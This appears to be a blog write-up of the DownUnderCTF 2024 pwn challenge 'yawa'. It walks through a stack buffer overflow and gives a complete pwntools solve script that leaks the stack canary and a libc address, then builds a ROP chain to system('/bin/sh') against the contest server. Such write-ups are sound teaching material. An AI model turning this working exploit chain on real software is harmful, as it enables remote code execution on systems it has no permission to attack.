+++
title = 'DownUnderCTF 2024 - pwn/yawa'
date = 2024-07-07T10:47:36-04:00
draft = false
+++

We are given a binary with all protections turned on, and c source code..

```sh
[d@d-20tk001gus yaw]$ pwn checksec --file=yawa
[*] '/home/d/Downloads/DUCTF24/yaw/yawa'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int menu() {
    int choice;
    puts("1. Tell me your name");
    puts("2. Get a personalised greeting");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

int main() {
    init();

    char name[88];
    int choice;

    while(1) {
        choice = menu();
        if(choice == 1) {
            read(0, name, 0x88);
        } else if(choice == 2) {
            printf("Hello, %s\n", name);
        } else {
            break;
        }
    }
}
```

First, we need to leak out the canary. We can do this by filling the name buffer with 88 bytes. Then, when we select option 2 and name is printed, it will also print out the canary

```python
    r.sendline("1")
    r.sendline(b"A" * 88)
    r.recv()
    r.sendline("2")
    
    r.recvuntil(b"A" * 88)
    canary = u64(r.recv(8).strip().rjust(8, b'\x00'))
    print(hex(canary))
```

Next we need to get the libc base address. Examining the stack with gdb, I saw that the return address was __libc_start_call_main+128 and it was 104 bytes from our buffer. We send 103 bytes because of the newline character.


```python
    r.sendline(b"1")
    r.sendline(b"A" * 103)
    r.recv()
    r.recv()
    r.sendline(b"2")
    r.recvuntil(b"A" * 103)
    libc_leak = u64(r.recv(7).strip().ljust(8, b'\x00'))
```

Using this leaked address, we can calculate the libc base address. Now we can use whatever gadgets we want in the provided libc. Easiest way to pop a shell is using system with /bin/sh. Full solve script below.


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./yawa_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe
context.terminal = ["alacritty", "-e"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("2024.ductf.dev", 30010)

    return r


def main():
    r = conn()
    libc_start = libc.sym.__libc_start_call_main + 128

    r.sendline("1")
    r.sendline(b"A" * 88)
    r.recv()
    r.sendline("2")
    
    r.recvuntil(b"A" * 88)
    canary = u64(r.recv(8).strip().rjust(8, b'\x00'))
    print(hex(canary))

    r.sendline(b"1")
    r.sendline(b"A" * 103)
    r.recv()
    r.recv()
    r.sendline(b"2")
    r.recvuntil(b"A" * 103)
    libc_leak = u64(r.recv(7).strip().ljust(8, b'\x00'))
    
    libc.address = libc_leak - libc_start
    print(hex(libc.address))

    pop_rdi = libc.address + 0x000000000002a3e5
    ret = libc.address + 0x00000000000f410b
    sys_addr = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh")) 


    payload = flat([
        b'A' * 88,
        canary,
        0,
        pop_rdi,
        binsh,
        ret,
        sys_addr
    ])

    r.sendline("1")
    r.sendline(payload)
    r.sendline("3")


    r.interactive()


if __name__ == "__main__":
    main()
```


`DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`